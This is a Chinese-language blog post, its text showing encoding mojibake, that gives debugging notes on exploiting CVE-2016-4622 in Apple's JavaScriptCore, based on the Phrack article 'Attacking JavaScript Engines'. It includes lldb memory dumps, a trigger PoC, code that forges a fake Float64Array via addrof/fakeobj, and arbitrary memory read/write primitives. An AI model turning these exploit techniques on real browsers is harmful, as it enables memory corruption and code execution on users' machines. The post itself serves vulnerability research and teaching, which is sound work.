    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> æœ¬æ–‡åŸºäº<a href="phrack@saelo.net">saelo</a>åœ¨ <a href="http://phrack.org" target="_blank" rel="external">phrack</a>ä¸Šå‘è¡¨çš„<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>ä¸€æ–‡ï¼Œè®°å½•äº†è°ƒè¯•çš„è¿‡ç¨‹ã€‚</p>
<p><a href="https://github.com/saelo/jscpwn" target="_blank" rel="external">POC</a></p>
<p><a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">CVE-2016-4622è°ƒè¯•ç¬”è®°</a>è®°å½•æœ€åŸºæœ¬çš„æ¼æ´è§¦å‘è¿‡ç¨‹çš„è°ƒè¯•ã€‚</p>
<p>æœ¬æ–‡è®°å½•æ›´é«˜çº§åˆ©ç”¨æŠ€å·§çš„è°ƒè¯•è¿‡ç¨‹ã€‚</p>
<a id="more"></a>
<h1 id="0x01_æ•°æ®ç»“æ„">0x01 æ•°æ®ç»“æ„</h1><h2 id="1-1_JSCell_&amp;&amp;_JSObject">1.1 JSCell &amp;&amp; JSObject</h2><p>é€šè¿‡é˜…è¯»æºç <code>JSCell</code>çš„ç»“æ„ä¸­çš„æˆå‘˜å˜é‡å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSCell &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSValue;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> MarkedBlock;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span>* <span class="title">allocateCell</span><span class="params">(Heap&amp;)</span></span>;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span>* <span class="title">allocateCell</span><span class="params">(Heap&amp;, size_t)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> LLIntOffsetsExtractor;</span><br><span class="line"></span><br><span class="line">    StructureID m_structureID;</span><br><span class="line">    IndexingType m_indexingType;</span><br><span class="line">    JSType m_type;</span><br><span class="line">    TypeInfo::InlineTypeFlags m_flags;</span><br><span class="line">    <span class="keyword">uint8_t</span> m_gcData;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>JSCell</code>ä¸€å…±æœ‰5ä¸ªæˆå‘˜å˜é‡ï¼Œå…·ä½“æ¯ä¸ªå˜é‡æœ‰ä»€ä¹ˆç”¨ï¼Œåœ¨saeloçš„æ–‡ç« ä¸­ä»‹ç»çš„å¾ˆæ¸…æ¥šï¼Œåœ¨<code>5.2 - JSObject internals</code>ä¸€èŠ‚ä¸­ã€‚</p>
<p>é€šè¿‡é˜…è¯»æºç <code>JSObject</code>çš„ç»“æ„ä¸­æˆå‘˜å˜é‡å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSObject : <span class="keyword">public</span> JSCell &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> BatchedTransitionOptimizer;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JIT;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSCell;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSFinalObject;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> MarkedBlock;</span><br><span class="line">    <span class="function">JS_EXPORT_PRIVATE <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">setUpStaticFunctionSlot</span><span class="params">(ExecState*, <span class="keyword">const</span> HashTableValue*, JSObject*, PropertyName, PropertySlot&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">enum</span> PutMode &#123;</span><br><span class="line">        PutModePut,</span><br><span class="line">        PutModeDefineOwnProperty,</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="comment">/*....*/</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    CopyWriteBarrier&lt;Butterfly&gt; m_butterfly;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> USE(JSVALUE32_64)</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">uint32_t</span> m_padding;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>JSObject</code>åªæœ‰ä¸€ä¸ªæˆå‘˜å˜é‡<code>m_butterfly</code>ï¼Œå­˜å‚¨<code>JSObject</code>ä¸­å­˜å‚¨çš„æ•°æ®ã€‚</p>
<p>é€šè¿‡<code>lldb</code>è°ƒè¯•<code>poc.js</code>ï¼ŒéªŒè¯æºç åˆ†æçš„ç»“è®ºã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">	a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line">print (b);</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p this&#10;(JSC::JSArray *) $0 = 0x0000000106fc7ed0&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106fc7ed0&#10;0x106fc7ed0: 0x010814070000004d 0x00000001069e4170&#10;0x106fc7ee0: 0x010814030000004b 0x00000001069e4148&#10;0x106fc7ef0: 0x01081400000000b9 0x00000001069e3028&#10;0x106fc7f00: 0x01081400000000b8 0x00000001069e2b48&#10;0x106fc7f10: 0x01001400000000b7 0x00000001069e2a68&#10;(lldb) p *this&#10;(JSC::JSArray) $1 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;&#10;        m_structureID = 77&#10;        m_indexingType = &#39;\a&#39;&#10;        m_type = ObjectType&#10;        m_flags = &#39;\b&#39;&#10;        m_cellState = NewWhite&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ª<code>dword</code>å°±æ˜¯<code>JSCell</code>çš„å†…å®¹(<code>0x010814070000004d</code>)ï¼Œç¬¬äºŒä¸ª<code>dword</code>å°±æ˜¯<code>m_butterfly</code>çš„å†…å®¹(<code>0x00000001069e4170</code>)ã€‚</p>
<p><code>0x010814070000004d</code>å¯ä»¥é€šè¿‡è¿™ä¸ªæ•°æ®ç»“æ„æ¥è§£æï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            StructureID structureID;</span><br><span class="line">            IndexingType indexingType;</span><br><span class="line">            JSType type;</span><br><span class="line">            TypeInfo::InlineTypeFlags inlineTypeFlags;</span><br><span class="line">            JSCell::GCData defaultGCData;</span><br><span class="line">        &#125; fields;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            <span class="keyword">int32_t</span> word1;</span><br><span class="line">            <span class="keyword">int32_t</span> word2;</span><br><span class="line">        &#125; words;</span><br><span class="line">        <span class="keyword">int64_t</span> doubleWord;</span><br><span class="line">    &#125; u;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_JSObject_internals">1.2 JSObject internals</h2><p>å¦‚æœä¸€ä¸ª<code>JSObject</code>çš„æˆå‘˜å°‘äº6ä¸ª(é»˜è®¤æƒ…å†µ)ï¼Œå°±ä¸ä¼šå»ä½¿ç”¨<code>butterfly</code>å­˜å‚¨æ•°æ®ï¼Œè€Œæ˜¯ç´§è·Ÿç€<code>JSObject</code>çš„æ•°æ®ç»“æ„çº¿æ€§çš„å­˜æ”¾åœ¨å†…å­˜ä¸­ã€‚</p>
<p>é€šè¿‡è°ƒè¯•å¦‚ä¸‹ä»£ç ï¼ŒéªŒè¯è¯¥ç‰¹æ€§ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;<span class="string">'a'</span>: <span class="number">0x1337</span>, <span class="string">'b'</span>: <span class="literal">false</span>, <span class="string">'c'</span>: <span class="number">13.37</span>, <span class="string">'d'</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]&#125;;</span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj)</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>JSObject::getOwnPropertyNames</code>å‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿ<code>obj</code>çš„å†…å­˜ç»“æ„ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 76862 stopped&#10;* thread #1: tid = 0x2f6b12, 0x0000000100d01cca JavaScriptCore`JSC::JSObject::getOwnPropertyNames(object=0x00000001065d09d0, exec=0x00007fff5fbfd940, propertyNames=0x00007fff5fbfd890, mode=(m_dontEnumPropertiesMode = Include, m_jsObjectPropertiesMode = Include)) + 170 at JSObject.cpp:1789, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100d01cca JavaScriptCore`JSC::JSObject::getOwnPropertyNames(object=0x00000001065d09d0, exec=0x00007fff5fbfd940, propertyNames=0x00007fff5fbfd890, mode=(m_dontEnumPropertiesMode = Include, m_jsObjectPropertiesMode = Include)) + 170 at JSObject.cpp:1789&#10;   1786&#9;        return;&#10;   1787&#9;    &#125;&#10;   1788&#10;-&#62; 1789&#9;    if (propertyNames.includeStringProperties()) &#123;&#10;   1790&#9;        // Add numeric properties first. That appears to be the accepted convention.&#10;   1791&#9;        // FIXME: Filling PropertyNameArray with an identifier for every integer&#10;   1792&#9;        // is incredibly inefficient for large arrays. We need a different approach,&#10;(lldb) p this&#10;error: invalid use of &#39;this&#39; outside of a non-static member function&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001065d09d0&#10;0x1065d09d0: 0x01001500000000f4 0x0000000000000000&#10;0x1065d09e0: 0xffff000000001337 0x0000000000000006&#10;0x1065d09f0: 0x402bbd70a3d70a3d 0x00000001065c7ee0&#10;0x1065d0a00: 0x010a1700000000ee 0x0000000105fe4148&#10;0x1065d0a10: 0x00000001065e7900 0x00000001065a65c0</span><br></pre></td></tr></table></figure>
<p>å…¶ç»“æœç¡®å®å¦‚<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>ä¸­æ‰€è¿°ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1065d09d0: 0x01001500000000f4 0x0000000000000000 //jscell,m_butterfly&#10;0x1065d09e0: 0xffff000000001337 0x0000000000000006 //0x1337,false&#10;0x1065d09f0: 0x402bbd70a3d70a3d 0x00000001065c7ee0 //13.37,[1,2,3,4]&#36825;&#20010;&#25968;&#32452;&#30340;&#22320;&#22336;&#12290;</span><br></pre></td></tr></table></figure>
<h2 id="1-3_StructureID">1.3 StructureID</h2><p><code>JSCell</code>ç»“æ„ä½“ä¸­çš„<code>m_structureID</code>ä¼šåœ¨<code>JS</code>çš„è™šæ‹Ÿæœºä¸­ç´¢å¼•åˆ°å¯¹åº”çš„<code>Structure</code>çš„æ•°æ®ç»“æ„ï¼Œåœ¨<code>JavaScript</code>ä¸­<code>Structure</code>ç”¨æ¥å­˜å‚¨<code>Object</code>çš„<code>Class</code>çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬<code>object</code>ä¸­çš„å±æ€§ã€‚</p>
<p>åœ¨<code>Structure</code>çš„å¤´æ–‡ä»¶ä¸­å®šä¹‰å‡ºå¦‚ä¸‹ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ClassInfo* m_classInfo;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>ClassInfo</code>çš„å®šä¹‰ä¸­ï¼Œ<code>MethodTable</code>å®šä¹‰äº†ä¸€ç³»åˆ—çš„å‡½æ•°æŒ‡é’ˆï¼Œé’ˆå¯¹ä¸åŒç±»å‹çš„<code>Object</code>ï¼Œä¼šæœ‰ä¸åŒçš„å®ç°ã€‚</p>
<p>æ‰€ä»¥åœ¨ä¼ªé€ <code>Object</code>çš„æ—¶å€™éœ€è¦ä¸€ä¸ªæ­£ç¡®çš„<code>StructureID</code>ï¼Œå¦åˆ™åœ¨è°ƒç”¨<code>MethodTable</code>ä¸­çš„å‡½æ•°çš„æ—¶ä¼šå¯¼è‡´å´©æºƒã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ClassInfo &#123;</span><br><span class="line">    <span class="comment">// A string denoting the class name. Example: "Window".</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* className;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pointer to the class information of the base class.</span></span><br><span class="line">    <span class="comment">// nullptrif there is none.</span></span><br><span class="line">    <span class="keyword">const</span> ClassInfo* parentClass;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubClassOf</span><span class="params">(<span class="keyword">const</span> ClassInfo* other)</span> <span class="keyword">const</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> ClassInfo* ci = <span class="keyword">this</span>; ci; ci = ci-&gt;parentClass) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ci == other)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasStaticProperties</span><span class="params">()</span> <span class="keyword">const</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> ClassInfo* ci = <span class="keyword">this</span>; ci; ci = ci-&gt;parentClass) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ci-&gt;staticPropHashTable)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasStaticSetterOrReadonlyProperties</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> HashTable* staticPropHashTable;</span><br><span class="line"></span><br><span class="line">    MethodTable methodTable;</span><br><span class="line"></span><br><span class="line">    TypedArrayType typedArrayStorageType;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-4_JSArrayBufferView">1.4 JSArrayBufferView</h2><p>åœ¨ä¼ªé€ <code>Object</code>çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯<code>Float64Array</code>ï¼Œåœ¨<code>JSC</code>å¼•æ“ä¸­çš„å®ç°æ˜¯<code>JSArrayBufferView</code>ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSArrayBufferView : <span class="keyword">public</span> JSNonFinalObject &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> JSNonFinalObject Base;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">void</span>* m_vector;</span><br><span class="line">    <span class="keyword">uint32_t</span> m_length;</span><br><span class="line">    TypedArrayMode m_mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç»§æ‰¿<code>JSObject</code>åˆæ·»åŠ äº†ä¸‰ä¸ªæˆå‘˜å˜é‡ã€‚<code>m_vector</code>å­˜å‚¨äº†å…·ä½“çš„æ•°æ®ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+----------------+&#10;| Float64Array   |&#10;+----------------+&#10;|  JSCell        |&#10;|  butterfly     |&#10;|  vector        |&#10;|  length        |&#10;|  mode          |&#10;+----------------+</span><br></pre></td></tr></table></figure>
<h1 id="0x02_FakeObject">0x02 FakeObject</h1><p>ä¼ªä»£ç å¦‚ä¸‹ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥çœ‹<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>ä¸€æ–‡ï¼Œè¿™é‡Œæ·»åŠ ä¸€äº›æ³¨é‡Šæ›´è¯¦ç»†çš„è§£é‡Šã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">sprayFloat64ArrayStructures(); <span class="comment">//éšæœºåˆ›å»ºnä¸ªFloat64Arrayçš„æ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the array that will be used to</span></span><br><span class="line"><span class="comment">// read and write arbitrary memory addresses.</span></span><br><span class="line"><span class="keyword">var</span> hax = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> jsCellHeader = <span class="keyword">new</span> Int64([</span><br><span class="line">    <span class="number">00</span>, <span class="number">0x10</span>, <span class="number">00</span>, <span class="number">00</span>,  <span class="comment">// m_structureID, current guess</span></span><br><span class="line">    <span class="number">0x0</span>,               <span class="comment">// m_indexingType</span></span><br><span class="line">    <span class="number">0x27</span>,              <span class="comment">// m_type, Float64Array</span></span><br><span class="line">    <span class="number">0x18</span>,              <span class="comment">// m_flags, OverridesGetOwnPropertySlot |</span></span><br><span class="line">                       <span class="comment">// InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero           </span></span><br><span class="line">    <span class="number">0x1</span>                <span class="comment">// m_cellState, NewWhite</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„containerç±»æ¯”äº1.2å°èŠ‚ä¸­çš„objã€‚æ„å»ºäº†ä¸€ä¸ªå«åšcontainerçš„objectã€‚</span></span><br><span class="line"><span class="comment">//jsCellHeaderã€butterflyã€vectorã€lengthAndFlags</span></span><br><span class="line"><span class="comment">//è¿™äº›éƒ½æ˜¯containerçº¿æ€§å­˜å‚¨åœ¨m_butterflyæŒ‡é’ˆåçš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="keyword">var</span> container = &#123;</span><br><span class="line">    jsCellHeader: jsCellHeader.encodeAsJSVal(),</span><br><span class="line">    butterfly: <span class="literal">false</span>,       <span class="comment">// Some arbitrary value</span></span><br><span class="line">    vector: hax,</span><br><span class="line">    lengthAndFlags: (<span class="keyword">new</span> Int64(<span class="string">'0x0001000000000010'</span>)).asJSValue()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the fake Float64Array.</span></span><br><span class="line"><span class="keyword">var</span> address = Add(addrof(container), <span class="number">16</span>);</span><br><span class="line"><span class="comment">// containerçš„åœ°å€åŠ 16ï¼Œæ˜¯ä¸ºäº†è·³è¿‡JSCellçš„å€¼å’Œm_butterflyçš„æŒ‡é’ˆã€‚</span></span><br><span class="line"><span class="keyword">var</span> fakearray = fakeobj(address);</span><br><span class="line"><span class="comment">// fakearryå°±æ­»é€šè¿‡fakeobjè·å–åˆ°çš„ä¼ªé€ çš„object</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ps:</span></span><br><span class="line"><span class="comment">//addrofå’Œfakeobjæœ¬æ–‡ä¸åšèµ˜è¿°ï¼Œç»†èŠ‚åœ¨Attacking JavaScript EnginesåŸæ–‡ä¸­æœ‰è¯¦ç»†æè¿°ã€‚</span></span><br><span class="line"><span class="comment">//è·å–objectçš„åœ°å€ï¼Œé€šè¿‡åœ°å€è·å–fakeobj</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Find the correct structure ID.</span></span><br><span class="line"><span class="comment">// é€šè¿‡å¯¹æ¯”å¯»æ‰¾Float64Arrayå¯¹åº”çš„structure ID</span></span><br><span class="line"><span class="keyword">while</span> (!(fakearray <span class="keyword">instanceof</span> <span class="built_in">Float64Array</span>)) &#123;</span><br><span class="line">    jsCellHeader.assignAdd(jsCellHeader, Int64.One);</span><br><span class="line">    container.jsCellHeader = jsCellHeader.encodeAsJSVal();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡lldbè§‚å¯Ÿ<code>container</code>çš„åœ°å€ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 --count 10 0x0000000106c1e170&#10;0x106c1e170: 0x0100150000001134 0x0000000000000000   --&#62;JSCell,m_butterfly=NULL&#10;0x106c1e180: 0x0118270000001000 0x0000000000000006   --&#62;jsCellHeader&#65292;butterfly=false&#10;0x106c1e190: 0x0000000106c173c0 0x0001000000000010   --&#62;vector=hax,lengthAndFlags&#10;0x106c1e1a0: 0x010a170000000031 0x0000000000000000&#10;0x106c1e1b0: 0x0000000106c1e1d0 0x0000000106d8bd80</span><br></pre></td></tr></table></figure>
<p>å°±å’Œä¹‹å‰æåˆ°çš„ä¸€æ ·ï¼Œå› ä¸ºå±æ€§å°‘äº6ä¸ªï¼Œm_butterflyæ˜¯NULLã€‚</p>
<p>é€šè¿‡lldbè§‚å¯Ÿ<code>fakearray</code>çš„åœ°å€ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(JSC::JSArrayBufferView*)0x106c1e180&#10;(JSC::JSArrayBufferView) $0 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;                                   --&#62;jsCellHeader &#10;        m_structureID = 4096                            --&#62;00, 0x10, 00, 00,&#10;        m_indexingType = &#39;\0&#39;                           --&#62;0x0, &#10;        m_type = Float64ArrayType                       --&#62;0x27, &#10;        m_flags = &#39;\x18&#39;                                --&#62;0x18,&#10;        m_cellState = NewWhite                          --&#62;0x1,&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x0000000000000006) --&#62;butterfly:false&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;  m_vector = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x0000000106c173c0)  --&#62;vector: hax&#10;  &#125;&#10;  m_length = 16           --&#62; lengthAndFlags: (new Int64(&#39;0x0001000000000010&#39;)).asJSValue()&#10;  m_mode = 65536&#10;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03_ä»»æ„å†…å­˜è¯»å†™">0x03 ä»»æ„å†…å­˜è¯»å†™</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">memory = &#123;</span><br><span class="line">    read: <span class="function"><span class="keyword">function</span>(<span class="params">addr, length</span>) </span>&#123;</span><br><span class="line">        print(<span class="string">"[&lt;] Reading "</span> + length + <span class="string">" bytes from "</span> + addr);</span><br><span class="line">        fakearray[<span class="number">2</span>] = addr.asDouble();</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            a[i] = hax[i];</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    readInt64: <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Int64(<span class="keyword">this</span>.read(addr, <span class="number">8</span>));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    write: <span class="function"><span class="keyword">function</span>(<span class="params">addr, data</span>) </span>&#123;</span><br><span class="line">        print(<span class="string">"[&gt;] Writing "</span> + data.length + <span class="string">" bytes to "</span> + addr);</span><br><span class="line">        fakearray[<span class="number">2</span>] = addr.asDouble();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            hax[i] = data[i];</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    writeInt64: <span class="function"><span class="keyword">function</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.write(addr, val.bytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
